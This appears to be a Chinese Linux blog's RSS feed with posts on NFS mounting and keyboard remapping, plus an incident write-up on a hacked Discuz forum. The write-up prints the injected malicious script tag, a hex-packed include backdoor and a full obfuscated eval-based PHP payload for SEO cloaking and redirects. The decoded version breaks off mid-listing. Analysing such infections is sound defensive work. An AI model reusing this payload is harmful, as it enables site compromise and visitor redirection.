<dt><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error">MDN &gt; Web technology for developers &gt; JavaScript &gt; JavaScript reference &gt; Standard built-in objects &gt; Error</a></dt><dd>Error对象参考文档</dd>

<dt><a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.11">Error Objects</a></dt><dd>Error对象标准文档</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在linux使用nfs挂载其它linux机器上的文件夹]]></title>
            <link>/article/5728-linux-4f7f7528-nfs-63028f7d51765b83-linux-673a56684e0a768465874ef65939.html</link>
            <guid>/article/5728-linux-4f7f7528-nfs-63028f7d51765b83-linux-673a56684e0a768465874ef65939.html</guid>
            <pubDate>Tue, 23 Sep 2014 08:52:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
下面的IP地址以及工作目录需按实际情况进行修改。
</p>

<ul class="org-ul">
<li><p>
在本地机器上允许目录被远程挂载
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'/home/tangxinfa/workdir *(rw,sync,no_root_squash)'</span> &gt;&gt; /etc/exports
sudo exportfs -arv
</pre>
</div></li>

<li><p>
在远程机器上挂载本地机器上的文件夹
</p>

<div class="org-src-container">
<pre class="src src-sh">mkdir /tmp/Projects; mount -t nfs -o nolock 192.168.111.100:/home/tangxinfa/Proj<span style="text-decoration: underline;">ects /tmp/Projects</span>
</pre>
</div></li>
</ul>

<p>
问题诊断
</p>

<ul class="org-ul">
<li><p>
mount: RPC: Unable to receive; errno = Connection refused
</p>

<p>
需要启动nfs-server服务：
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable nfs-server.service
sudo systemctl start nfs-server.service
</pre>
</div>

<p>
另外，如果刚刚做了linux内核更新而没有重启系统也可能导致这个问题，重启一下再试。
</p></li>

<li><p>
mount: 192.168.111.100:/home/tangxinfa/Projects failed, reason given by server: Permission denied
</p>

<p>
在/etc/exports文件中允许目录被远程挂载即可。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Thinkpad T540p修复linux下触摸板按下时光标位置移动问题]]></title>
            <link>/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html</link>
            <guid>/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html</guid>
            <pubDate>Mon, 22 Sep 2014 06:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
执行以下设置命令即可
</p>

<div class="org-src-container">
<pre class="src src-sh">synclient <span style="color: #f0c674;">HorizHysteresis</span>=30 <span style="color: #f0c674;">VertHysteresis</span>=30
</pre>
</div>

<p>
将上面的命令放到~/.xprofile中，以便重启后仍然生效。
</p></li>
</ul>

<p>
参考：<a href="https://blog.lnx.cx/2014/03/20/fedora-20-and-the-thinkpad-t440s-touchpad/">Fedora 20 and the ThinkPad T440s touchpad | Technitribe</a></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下修改键位映射]]></title>
            <link>/article/linux-4e0b4fee6539952e4f4d66205c04.html</link>
            <guid>/article/linux-4e0b4fee6539952e4f4d66205c04.html</guid>
            <pubDate>Fri, 19 Sep 2014 06:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在linux下会大量使用ctrl和alt键，但是普通键盘上这两个键所在位置太偏，按起来非常吃力，交换键位可以很好的解决这个问题。
</p>

<ul class="org-ul">
<li><p>
通过gnome-tweak-tool进行修改
</p>

<p>
Typing页可以完成常用的修改，如：交换Caps Lock和Ctrl，交换左Ctrl和Alt。但是在我的笔记本上设置好后有时候会失效.
</p></li>

<li><p>
通过setxkbmap命令进行修改
</p>

<p>
Caps Lock改为Ctrl：setxkbmap -option ctrl:nocaps
</p>

<p>
可以查看/usr/share/X11/xkb/rules/evdev.lst查看支持的交换方式。Ctrl和Alt交换试了一下没有效果。
</p>

<p>
将setxkbmap设置命令放到~/.xprofile中即可开机生效。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
通过配置~/.Xmodmap进行修改
</p>

<p>
可以完成任意的键盘映射。
</p>

<p>
如下所示：Caps Lock改为Ctrl，左Ctrl改为Alt：
</p>

<pre class="example">
keycode 66 = Control_L
clear Lock
add control = Control_L

clear control
clear mod1
keycode 37 = Alt_L Meta_L
add control = Control_L Control_R
add mod1 = Alt_L Meta_L
</pre>

<p>
启用设置：
</p>

<div class="org-src-container">
<pre class="src src-sh">xmodmap ~/.Xmodmap
</pre>
</div>

<p>
在~/.xprofile中添加以上指令以便开机生效：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b5bd68;">if</span> [ -f $<span style="color: #f0c674;">HOME</span>/.Xmodmap ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   /usr/bin/xmodmap $<span style="color: #f0c674;">HOME</span>/.Xmodmap
<span style="color: #b5bd68;">fi</span>
</pre>
</div>

<p>
参考：
</p>

<ul class="org-ul">
<li><a href="http://earthviaradio.wordpress.com/2012/02/06/swapping-the-left-alt-and-ctrl-keys-in-ubuntu-11-10/">Swapping the left Alt and Ctrl keys in Ubuntu 11.10</a></li>

<li><a href="http://efod.se/writings/linuxbook/html/caps-lock-to-ctrl.html">Changing your caps lock into Ctrl in X</a></li>

<li><a href="https://wiki.archlinux.org/index.php/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Xmodmap (简体中文)</a></li>
</ul></li>

<li><p>
清除xmodmap以及setxkbmap的配置
</p>

<div class="org-src-container">
<pre class="src src-sh">setxkbmap -layout us
</pre>
</div></li>

<li><p>
换hhkb pro2键盘
</p>

<p>
linux用户必备，ctrl和alt键已经放置到最优位置，而且后面的跳线开关支持常用的键位交换，即使是linux文本模式下也可用。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org805ce47" class="outline-2">
<h2 id="org805ce47">发现问题</h2>
<div class="outline-text-2" id="text-org805ce47">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-org569afe6" class="outline-2">
<h2 id="org569afe6">解决问题</h2>
<div class="outline-text-2" id="text-org569afe6">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧</li>

<li><p>
打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 
</p>

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li><p>
将恶意站点配置一条 <code>hosts</code> 
</p>

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre></li>
</ul>

<p>
浏览器不再自动跳转到恶意网站了。 
</p></li>

<li><p>
从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #de935f;">div</span> <span style="color: #f0c674;">style</span>='display:none'&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">language</span>='javascript' <span style="color: #f0c674;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #f0c674;">&amp;logo</span>=1' <span style="color: #f0c674;">charset</span>='gb2312'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;&lt;/<span style="color: #de935f;">div</span>&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>='text/javascript' <span style="color: #f0c674;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div></li>

<li><p>
在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #81a2be;">INCLUDE</span>(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #8abeb7;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org7d808cd" class="outline-2">
<h2 id="org7d808cd">分析恶意代码</h2>
<div class="outline-text-2" id="text-org7d808cd">
<ul class="org-ul">
<li><p>
<code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">O00OO0</span>=urldecode(<span style="color: #8abeb7;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #8abeb7; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{6}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{18}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{1}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{7}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{13};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{22}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{36}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{29}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{32}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{35}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #b5bd68; text-decoration: underline;">eval</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div></li>

<li><p>
参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; font-style: italic;">*author:whoami</span>
<span style="color: #969896; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #969896; font-style: italic;">*/</span>
error_reporting(0);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span> = <span style="color: #8abeb7;">'/var/tmp/.SYSDUMP/'</span>;
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_USER_AGENT'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'117.28.255.37'</span>,<span style="color: #8abeb7;">'116.55.241.24'</span>,<span style="color: #8abeb7;">'125.64.94.219'</span>,<span style="color: #8abeb7;">'119.147.114.213'</span>,<span style="color: #8abeb7;">'11</span><span style="color: #8abeb7; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: 